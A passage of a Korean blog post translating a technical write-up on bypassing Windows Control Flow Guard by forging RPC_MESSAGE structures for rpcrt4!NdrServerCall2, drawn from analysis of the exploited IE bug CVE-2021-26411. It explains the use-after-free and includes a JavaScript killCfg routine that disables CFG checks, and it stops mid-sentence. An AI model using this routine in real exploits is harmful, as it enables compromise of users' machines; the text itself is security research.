    <content type="html"><![CDATA[<h1 id="&#xBC88;&#xC5ED;-&#xCD94;&#xC2E0;"><a href="#&#xBC88;&#xC5ED;-&#xCD94;&#xC2E0;" class="headerlink" title="&#xBC88;&#xC5ED; &#xCD94;&#xC2E0;"></a>&#xBC88;&#xC5ED; &#xCD94;&#xC2E0;</h1><p>Hackyboiz &#xBE14;&#xB85C;&#xADF8; &#xC6B4;&#xC601; &#xCD08;&#xBC18;&#xC5D0; CFG&#xC640; XFG&#xC5D0; &#xB300;&#xD55C; &#xC5F0;&#xAD6C;&#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xACE0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. CFG Bitmap &#xC0DD;&#xC131; &#xBD80;&#xBD84;&#xC744; &#xACF5;&#xBD80;&#xD558;&#xB2E4;&#xAC00; &#xBA38;&#xB9AC;&#xAC00; &#xBED0;&#xADFC;&#xD574;&#xC11C; &#xC7A0;&#xC2DC; &#xBA48;&#xCD98;&#xB2E4;&#xB294; &#xAC8C; &#xC544;&#xC608; &#xBB34;&#xC0B0;&#xB418;&#xBC84;&#xB838;&#xB124;&#xC694;. &#xC5F0;&#xAD6C;&#xD300; &#xD615;&#xB2D8; &#xD55C;&#xBD84;&#xAED8;&#xC11C; &#xD574;&#xB2F9; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xB358; &#xC800;&#xB97C; &#xBCF4;&#xC2DC;&#xACE4; &#x201C;&#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158;&#xC740; &#xC774;&#xC81C; &#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xB0D0; &#x314B;&#x314B;&#x314B;?&#x201D; &#xC774;&#xB7F0; &#xB9D0;&#xC500;&#xC744; &#xD558;&#xC168;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; CFG bypass&#xB77C;&#xB294; &#xC81C;&#xBAA9;&#xC758; &#xAE00;&#xC744; &#xADF8;&#xB0E5; &#xC9C0;&#xB098;&#xCE60; &#xC218;&#xAC00; &#xC5C6;&#xB354;&#xAD70;&#xC694;. &#xC774;&#xB7F0; &#xC774;&#xC720;&#xB85C; &#xC774;&#xBC88;&#xC5D0; &#xC77D;&#xC740; &#xAE00; &#xD558;&#xB098; &#xBC88;&#xC5ED;&#xD574;&#xC11C; &#xC62C;&#xB9BD;&#xB2C8;&#xB2E4;.</p><p><a href="https://iamelli0t.github.io/2021/04/10/RPC-Bypass-CFG.html">&#xC6D0;&#xBB38;: Exploiting Windows RPC to bypass CFG mitigation</a></p><h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p>&#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xB80C;&#xB354; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC758; &#xBCF4;&#xD3B8;&#xC801;&#xC778; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xACF5;&#xACA9;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC784;&#xC758;&#xC758; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC838;&#xC628; &#xD6C4; execution flow&#xB97C; &#xD0C8;&#xCDE8;&#xD558;&#xAE30; &#xC704;&#xD574; DOM/js &#xAC1D;&#xCCB4;&#xC758; vtable&#xC744; &#xBCC0;&#xC870;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB2E4;&#xC74C; ROP chain&#xC5D0; &#xC758;&#xD574; &#xD638;&#xCD9C;&#xB41C; VirtualProtect&#xAC00; &#xC258; &#xCF54;&#xB4DC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; PAGE_EXECUTE_READWITE&#xB85C; &#xC218;&#xC815;&#xD558;&#xACE0; execution flow&#xAC00; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC258; &#xCF54;&#xB4DC;&#xB85C; &#xC774;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;. Windows 8.1 &#xC774;&#xD6C4;&#xB85C; Microsoft&#xB294; CFG(Control Flow Guard) &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC744; &#xB3C4;&#xC785;&#xD558;&#xC5EC; indirect function call(vtable&#xC744; &#xCC38;&#xC870;&#xD558;&#xB294; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xBC29;&#xC2DD;)&#xC744; &#xD65C;&#xC6A9;&#xD55C; vtable overwrite &#xACF5;&#xACA9;&#xC744; &#xAC10;&#xC9C0; &#xBC0F; &#xBC29;&#xC9C0;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC;, &#xC5EC;&#xAE30;&#xC11C; &#xB05D;&#xB098;&#xBA74; &#xC12D;&#xC12D;&#xD558;&#xC8E0;. CFG &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95;&#xC774; &#xB4F1;&#xC7A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; chackra/jscript9&#xC5D0;&#xC11C;&#xB294; &#xC2A4;&#xD0DD;&#xC758; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xC5EC; code execution flow&#xB97C; &#xAC00;&#xB85C;&#xCC44;&#xACE0;, v8&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC18D;&#xC131;&#xC774; &#xC788;&#xB294; WebAssembly&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC258; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. 2020&#xB144; 12&#xC6D4;, Microsoft&#xB294; Intel Tiger Lake CPU&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; CET(Control-flow Enforcement Technology) &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC744; Windows1020H1&#xC5D0; &#xB3C4;&#xC785;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; CET &#xD658;&#xACBD;&#xC5D0;&#xC11C; CFG&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xCDE8;&#xC57D;&#xC810; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC758; &#xC0C8;&#xB85C;&#xC6B4; &#xBB38;&#xC81C;&#xAC00; &#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC800;&#xD76C;&#xB294; &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; <a href="https://hackyboiz.github.io/2021/03/26/l0ch/2021-03-26/">CVE-2021-26411</a>&#xC758; &#xC0D8;&#xD50C;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB358; &#xC911; Windows RPC(Remote Procdure Call)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; CFG &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBC29;&#xBC95;&#xC740; ROP chain&#xC5D0; &#xC758;&#xC874;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC9DC; RPC_MESSAGE&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; rpcrt4!NdrServerCall2&#xB97C; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(Arbitrary Code Execution)&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="CVE-2021-25411"><a href="#CVE-2021-25411" class="headerlink" title="CVE-2021-25411"></a>CVE-2021-25411</h1><p>&#xC800;&#xC758; &#xBE14;&#xB85C;&#xADF8; &#xAE00; &#x201C;<a href="https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html">CVE-2021-26411: Internet Explorer mshtml use-after-free</a>&#x201C;&#xC5D0;&#xC11C; root cause&#xB97C; &#xBD84;&#xC11D;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. removeAttributeNode()&#xB294; nodeValue&#xC758; valueOf &#xCF5C;&#xBC31;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;. &#xCF5C;&#xBC31; &#xC911;&#xC5D0; clearAttributes()&#xAC00; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xC5B4; nodeValue&#xC5D0; &#xC800;&#xC7A5;&#xB41C; BSTR&#xB97C; &#xBBF8;&#xB9AC; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;. &#xCF5C;&#xBC31; &#xAC12;&#xC774; &#xBC18;&#xD658;&#xB41C; &#xD6C4; nodeValue &#xAC1D;&#xCCB4;&#xAC00; &#xC788;&#xB294; &#xACBD;&#xC6B0; UAF(Use-After-Free)&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Windows 3&#xC6D4; &#xD328;&#xCE58;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC218;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; CAttrArray::Destroy&#xD568;&#xC218;&#xC5D0; &#xAC1D;&#xCCB4;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/1.png" alt></p><p>&#xBA54;&#xBAA8;&#xB9AC; &#xD06C;&#xAE30;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xB294; UAF &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xACBD;&#xC6B0;, &#xC11C;&#xB85C; &#xB2E4;&#xB978; type&#xC758; &#xD3EC;&#xC778;&#xD130;(BSTR&#xACFC; Dictionary.item)&#xAC00; &#xC7AC;&#xC0AC;&#xC6A9; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xD558;&#xC5EC; type confusion&#xC5D0; &#xC758;&#xD55C; &#xD3EC;&#xC778;&#xD130; &#xB178;&#xCD9C; &#xBC0F; &#xD3EC;&#xC778;&#xD130; &#xCC38;&#xC870; &#xD574;&#xC81C;&#xB97C; &#xB2EC;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/2.png" alt></p><h1 id="Windows-RPC-introduction-and-exploitation"><a href="#Windows-RPC-introduction-and-exploitation" class="headerlink" title="Windows RPC introduction and exploitation"></a>Windows RPC introduction and exploitation</h1><p>Windows RPC&#xB294; &#xBD84;&#xC0B0;&#xB41C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;/&#xC11C;&#xBC84; function call &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. Windows RPC&#xC5D0; &#xC758;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xC11C;&#xBC84; &#xD568;&#xC218;&#xB97C; &#xB85C;&#xCEEC; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC778; &#xAC83;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C; &#xC0AC;&#xC9C4;&#xC740; Windows RPC&#xC758; &#xAE30;&#xBCF8; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/3.png" alt></p><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;/&#xC11C;&#xBC84; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xD638;&#xCD9C; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218; &#xD639;&#xC740; &#xB9AC;&#xD134; &#xAC12;&#xC744; lower-level Stub &#xD568;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. Stub &#xD568;&#xC218;&#xB294; NDR(Network Data Representation) &#xD3EC;&#xB9F7;&#xC73C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCEA1;&#xC290;&#xD654;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. Runtime library&#xB97C; &#xD1B5;&#xD55C; &#xD1B5;&#xC2E0;&#xC744; rpcrt4.dll&#xC5D0; &#xC758;&#xD574; &#xC81C;&#xACF5;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; idl &#xC608;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">[uuid(<span class="hljs-string">&quot;1BC6D261-B697-47C2-AF83-8AE25922C0FF&quot;</span>),version(<span class="hljs-number">1.0</span>)]interface HelloRPC{<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span>;}</code></pre><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; add &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xC11C;&#xBC84;&#xB294; rpcrt4.dll&#xB85C;&#xBD80;&#xD130; &#xCC98;&#xB9AC; &#xC694;&#xCCAD;&#xC744; &#xC218;&#xC2E0;&#xD558;&#xACE0; rpcrt4!NdrServerCall2&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/4.png" alt></p><p>rpcrt4!NdrServerCall2&#xC5D0;&#xB294; &#xD568;&#xC218; &#xC778;&#xB371;&#xC2A4; &#xBC0F; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xC640; &#xAC19;&#xC740; &#xC911;&#xC694;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD3EC;&#xD568;&#xD55C; PRPC_MESSAGE&#xB9CC;&#xC744; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB85C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC11C;&#xBC84; RPC_MESSAGE &#xAD6C;&#xC870;&#xCCB4;&#xC640; main sub data &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/5.png" alt></p><p>&#xC55E;&#xC11C; &#xC5B8;&#xAE09;&#xD55C; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774;, RPC_MESSAGE &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xC911;&#xC694;&#xD55C; &#xB450; &#xAC00;&#xC9C0; &#xBCC0;&#xC218;&#xB294; Buffer&#xC640; RpcInterfaceInformation&#xC785;&#xB2C8;&#xB2E4;. Buffer&#xB294; &#xD568;&#xC218;&#xC758; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; RpcInterfaceInformation&#xC740; RPC_SERVER_INTERFACE &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. RPC_SERVER_INTERFACE &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC11C; DispatchTable(+0x2c)&#xC740; runtime library&#xC640; stub &#xD568;&#xC218;&#xC758; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0;, InterpreterInfo(+0x3c)&#xB294; MIDL_SERVER_INFO&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;. MIDL_SERVER_INFO &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xC11C;&#xBC84; IDL &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0;, DispatchTable(+0x4)&#xC740; &#xC11C;&#xBC84; &#xB8E8;&#xD2F4; &#xD568;&#xC218;&#xC758; &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; RPC_MESSAGE &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC608;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC704;&#xC5D0;&#xC11C; &#xC81C;&#xC2DC;&#xD55C; idl&#xC5D0; &#xB530;&#xB974;&#xBA74;, &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; add(0x111, 0x222)&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; rpcrt4!NdrServerCall2&#xC5D0; break &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/6.png" alt></p><p>&#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xD1B5;&#xD574; &#xC5BB;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD504;&#xB97C; &#xBCF4;&#xBA74; &#xC704;&#xC5D0;&#xC11C; &#xBD84;&#xC11D;&#xD55C; RPC_MESSAGE &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xC77C;&#xCE58;&#xD558;&#xBA70; add &#xD568;&#xC218;&#xB294; MIDL_SERVER_INFO.DispatchTable&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C;, rpcrt4!NdrServerCall2&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; RPC_MESSAGE&#xB97C; &#xCC38;&#xC870;&#xD574;&#xC11C; add &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xC9C0; &#xBD84;&#xC11D;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p>rpcrt4!NdrServerCall2&#xB294; rpcrt4!NdrStubCall2&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. rpcrt4!NdrStubCall2&#xB294; MIDL_SERVER_INFO.DispatchTable&#xACFC; RPC_MESSAGE.ProcNum&#xC744; &#xCC38;&#xC870;&#xD574; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130; &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xC640; &#xD568;&#xC218;&#xC758; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;, &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xC758; &#xAE38;&#xC774;&#xB97C; rpcrt4!Invoke&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/7.png" alt></p><p>&#xB4DC;&#xB514;&#xC5B4; rpcrt4!Invoke&#xAC00; &#xC11C;&#xBC84;&#xB85C;&#xBD80;&#xD130; &#xBC1B;&#xC740; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/8.png" alt></p><p>&#xC704;&#xC758; &#xBD84;&#xC11D;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC784;&#xC758;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC740; &#xD6C4; &#xAC00;&#xC9DC; RPC_MESSAGE&#xB97C; &#xC0DD;&#xC131;, &#xC6D0;&#xD558;&#xB294; &#xD568;&#xC218;&#xC640; &#xADF8; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;, rpcrt4!NdrServerCall2 &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xB358; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C; &#xD574;&#xACB0;&#xD574;&#xC57C; &#xD560; &#xBB38;&#xC81C;&#xB294; &#xB450; &#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xBA74; javascript&#xB97C; &#xD1B5;&#xD574; rpcrt4!NdrServerCall2&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294;&#xAC00;?</li><li>rpc4!Invoke&#xC5D0;&#xC11C; &#xC11C;&#xBC84; &#xB8E8;&#xD2F4; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xCCB4;&#xD06C;&#xD558;&#xB294; CFG&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xACB0;&#xD560; &#xAC83;&#xC778;&#xAC00;?</li></ol><p><img src="/2021/04/14/fabu1ous/cfg-bypass/9.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC744; &#xD1B5;&#xD574; &#xC11C;&#xBC84; &#xB8E8;&#xD2F4; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; indirect function call&#xC774;&#xACE0;, CFG &#xAC80;&#xC0AC;&#xAC00; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xCCAB; &#xBC88;&#xC9F8; &#xBB38;&#xC81C;(&#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xBA74; javascript&#xB97C; &#xD1B5;&#xD574; rpcrt4!NdrServerCall2&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294;&#xAC00;?)&#xB97C; &#xD574;&#xACB0;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. DOM &#xAC1D;&#xCCB4; vtable&#xC758; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; rpcrt4!NdrServerCall2&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC65C;&#xB0D0;&#xD558;&#xBA74; rpcrt4!NdrServerCall2&#xB294; CFGBitmap&#xC5D0; &#xAE30;&#xB85D;&#xB41C;(&#xD654;&#xC774;&#xD2B8;&#xB9AC;&#xC2A4;&#xD305;&#xB41C;) &#xD568;&#xC218;&#xC774;&#xBA70; CFG &#xAC80;&#xC0AC;&#xAC00; &#xBE44;&#xC815;&#xC0C1; &#xB3D9;&#xC791;&#xC73C;&#xB85C; &#xD310;&#xB2E8;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C; &#xACF5;&#xACA9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB41C; &#xC0D8;&#xD50C;&#xC740; MSHTML!CAttribut::normalize&#xB97C; rpcrt4!NdrServerCall2&#xB85C; &#xBC14;&#xAFD4; &#xCE69;&#xB2C8;&#xB2E4;. &#xADF8;&#xB2E4;&#xC74C; javascript&#xC5D0;&#xC11C; &#x201C;xyz.normalize()&#x201D;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB860; rpcrt4!NdrServerCall2&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8; &#xBB38;&#xC81C;(rpc4!Invoke&#xC5D0;&#xC11C; &#xC11C;&#xBC84; &#xB8E8;&#xD2F4; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xCCB4;&#xD06C;&#xD558;&#xB294; CFG&#xB294; &#xC5B4;&#xB5BB;&#xAC8C; &#xD574;&#xACB0;&#xD560; &#xAC83;&#xC778;&#xAC00;?)&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD574;&#xACB0;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xAC00;&#xC9DC; RPC_MESSAGE&#xC640; rpcrt4!NdrServerCall2&#xB97C; &#xC0AC;&#xC6A9;&#xD574; VirtualProtect&#xB97C; &#xD638;&#xCD9C;, RPCRT4!__guard_check_ical_fptr&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xAD8C;&#xD55C;&#xC744; PAGE_EXECUTE_READWITE&#xB85C; &#xC218;&#xC815;</li><li>rpcrt4!__guard_check_icall_fptr&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xD3EC;&#xC778;&#xD130; ntdll!LdrpValidateUserCallTarget&#xB97C; ntdll!KiFastSystemCallRet&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD574; rpcrt4.dll&#xC5D0; &#xB300;&#xD55C; CFG &#xAC80;&#xC0AC;&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;</li><li>RPC4!__guard_check_icall_fptr&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBCF5;&#xAD6C;</li></ol><pre><code class="hljs c"><span class="hljs-function">function <span class="hljs-title">killCfg</span><span class="hljs-params">(addr)</span> </span>{  var cfgobj = <span class="hljs-keyword">new</span> CFGObject(addr)  <span class="hljs-keyword">if</span> (!cfgobj.getCFGValue())     <span class="hljs-keyword">return</span>  var guard_check_icall_fptr_address = cfgobj.getCFGAddress()  var KiFastSystemCallRet = getProcAddr(ntdll, &apos;KiFastSystemCallRet&apos;)  var tmpBuffer = createArrayBuffer(<span class="hljs-number">4</span>)  call2(VirtualProtect, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>, tmpBuffer])  write(guard_check_icall_fptr_address, KiFastSystemCallRet, <span class="hljs-number">32</span>)  call2(VirtualProtect, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, read(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])  <span class="hljs-built_in">map</span>.<span class="hljs-keyword">delete</span>(tmpBuffer)}</code></pre><p>&#xB450; &#xAC00;&#xC9C0; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD55C; &#xD6C4;, rpcrt4.dll&#xC5D0; &#xB300;&#xD55C; CFG&#xAC00; 